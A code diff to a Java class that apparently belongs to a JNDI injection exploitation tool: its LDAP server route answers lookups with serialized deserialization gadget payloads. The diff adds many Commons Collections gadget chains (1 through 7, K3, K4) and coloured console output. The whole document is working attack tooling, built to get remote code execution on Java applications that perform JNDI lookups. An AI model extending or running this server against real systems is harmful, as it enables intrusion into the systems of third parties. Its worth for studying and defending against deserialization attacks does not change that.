@@ -12,6 +12,8 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
+import static org.fusesource.jansi.Ansi.ansi;
+
 @LdapMapping(uri = { "/deserialization" })
 public class SerializedDataController implements LdapController {
     private GadgetType gadgetType;
@@ -20,7 +22,7 @@ public class SerializedDataController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        System.out.println("[+] Send LDAP result for " + base + " with javaSerializedData attribute");
+        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));
 
         //这个方法里面有改动，其他基本无改动
         Entry e = new Entry(base);
@@ -35,11 +37,41 @@ public class SerializedDataController implements LdapController {
             case commonsbeanutils2:
                 bytes = CommonsBeanutils2.getBytes(payloadType, params);
                 break;
+            case commonscollections1:
+                bytes = CommonsCollections1.getBytes(payloadType, params);
+                break;
+            case commonscollections1_1:
+                bytes = CommonsCollections1_1.getBytes(payloadType, params);
+                break;
+            case commonscollections2:
+                bytes = CommonsCollections2.getBytes(payloadType, params);
+                break;
+            case commonscollections3:
+                bytes = CommonsCollections3.getBytes(payloadType, params);
+                break;
+            case commonscollections4:
+                bytes = CommonsCollections4.getBytes(payloadType, params);
+                break;
+            case commonscollections5:
+                bytes = CommonsCollections5.getBytes(payloadType, params);
+                break;
+            case commonscollections6:
+                bytes = CommonsCollections6.getBytes(payloadType, params);
+                break;
+            case commonscollections7:
+                bytes = CommonsCollections7.getBytes(payloadType, params);
+                break;
             case commonscollectionsk1:
                 bytes = CommonsCollectionsK1.getBytes(payloadType, params);
                 break;
             case commonscollectionsk2:
                 bytes = CommonsCollectionsK2.getBytes(payloadType, params);
+                break;
+            case commonscollectionsk3:
+                bytes = CommonsCollectionsK3.getBytes(payloadType, params);
+                break;
+            case commonscollectionsk4:
+                bytes = CommonsCollectionsK4.getBytes(payloadType, params);
                 break;
             case jdk7u21:
                 bytes = Jdk7u21.getBytes(payloadType, params);
@@ -71,9 +103,9 @@ public class SerializedDataController implements LdapController {
             int secondIndex = base.indexOf("/", firstIndex + 1);
             try{
                 gadgetType = GadgetType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
-                System.out.println("[+] GaddgetType: " + gadgetType);
+                System.out.println("[+] GaddgetType >> " + gadgetType);
             }catch(IllegalArgumentException e){
-                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType: " + base.substring(firstIndex + 1, secondIndex));
+                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
             }
 
             if(gadgetType == GadgetType.urldns){
@@ -87,7 +119,7 @@ public class SerializedDataController implements LdapController {
             if(thirdIndex < 0) thirdIndex = base.length();
             try{
                 payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
-                System.out.println("[+] PayloadType: " + payloadType);
+                System.out.println("[+] PayloadType >> " + payloadType);
             }catch (IllegalArgumentException e){
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
             }
